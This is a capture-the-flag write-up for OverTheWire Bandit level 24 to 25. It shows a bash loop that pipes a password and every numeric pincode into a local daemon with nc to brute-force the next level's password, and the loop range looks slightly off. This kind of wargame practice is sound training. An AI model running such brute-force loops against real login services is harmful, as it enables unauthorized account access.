# Level 24 → Level 25

### Level Goal

A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.

You do not need to create new connections each time

### Solution:

* We write a bash script with password for bandit24 and numbers from 1 to 10000

```bash
$ grep -v text
is used to ignore when incorrect combinations for pincode is printed with text Wrong! Please enter the correct pincode. Try again.
```

<pre class="language-bash" data-overflow="wrap"><code class="lang-bash">bandit24@bandit:/tmp$ vi script.sh 
bandit24@bandit:/tmp$ cat script.sh
#!/bin/bash
for i in {1..10001} 
    do
        echo "**previous pass** $i"
    done
bandit24@bandit:/tmp$ chmod 700 script.sh
bandit24@bandit:/tmp$./script.sh | nc localhost 30002 | grep -v "Wrong! Please enter the correct p incode. Try again."
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the sec ret pincode on a single line, separated by a space.
Correct!
<strong>The password of user bandit25 is *****pass******
</strong>Exiting.
</code></pre>

